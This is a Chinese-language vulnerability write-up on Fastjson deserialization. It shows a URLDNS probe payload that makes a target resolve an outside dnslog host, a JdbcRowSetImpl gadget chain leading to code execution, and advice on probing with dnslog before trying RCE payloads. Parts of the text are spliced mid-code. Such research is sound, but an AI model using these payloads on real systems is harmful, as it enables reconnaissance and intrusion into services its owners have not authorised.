**作者：summersec  
本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！  
投稿邮箱：PI:EMAIL**
# 前言
Fastjson这款国内知名的解析json的组件，笔者在此就不多介绍，网络上有很多分析学习fastjson反序列化漏洞文章。笔者在此以一种全新角度从分析payload构造角度出发，逆向学习分析fastjson反序列化漏洞始末。  
ps：漏洞学习环境以代码均在上传[Github项目](https://github.com/SummerSec/JavaLearnVulnerability)。
* * *
# 初窥Payload
下面是一段最简单`Fastjson的版本号反序列化--URLDNS`代码，观察发现可以提出一个问题`@type`作用？
    import com.alibaba.fastjson.JSON;
    public class urldns {
        public static void main(String[] args) {
            // dnslog平台网站：http://www.dnslog.cn/
            String payload = "{{\"@type\":\"java.net.URL\",\"val\"" +
                    ":\"http://h2a6yj.dnslog.cn\"}:\"summer\"}";
            JSON.parse(payload);
        }
    }
* * *
#### @type的作用
下面是一段实验代码，帮助理解分析`@type`的由来。
    public class User {
        private String name;
        private int age;
        public String getName() {
            return name;
        }
        public void setName(String name) {
            this.name = name;
        }
        public int getAge() {
            return age;
        }
        public void setAge(int age) {
            this.age = age;
        }
         @Override
        public String toString() {
            return "User{" +
                    "name='" + name + '\'' +
                    ", age=" + age +
                    '}';
        }
    }
    package vul.fastjson;
    import com.alibaba.fastjson.JSON;
    import com.alibaba.fastjson.JSONObject;
    import com.alibaba.fastjson.serializer.SerializerFeature;
    public class Demo {
    //TODO 修改pom.xml中的fastjson `parseRest()`\-->`fieldDeser#setValue`\-->一系列反射调用-->`JdbcRowSetImpl#setAutoCommit()`触发漏洞。
**最后得到Gadget chain如下**
    /**
     * Gadget chain:
     *      JSON.parse()
     *          DefaultJSONParser.parse()
     *              DefaultJSONParser.parseObject()
     *                  JavaBeanDeserializer.deserialze()
     *                      JavaBeanDeserializer.parseRest()
     *                          FieldDeserializer.setValue()
     *                              Reflect.invoke()
     *                                  JdbcRowSetImpl.setAutoCommit()
     *
     */
* * *
# DNSLOG的一个小点
实战挖掘fastjson漏洞的时候比较常用的方法，探测Fastjson是用dnslog方式，探测到了再用RCE
Payload去一个一个打。但是本人在本地环境测试的时候发现了几个不同点，fastjson的版本不同，不同的payload成功概率是不同的。至于为什么是这样子，可以参考一下这篇[通过dnslog探测fastjson的几种方法](http://gv7.me/articles/2020/several-ways-to-detect-fastjson-through-dnslog/)。
            // 目前最新版1.2.72版本可以使用1.2.36   
* * *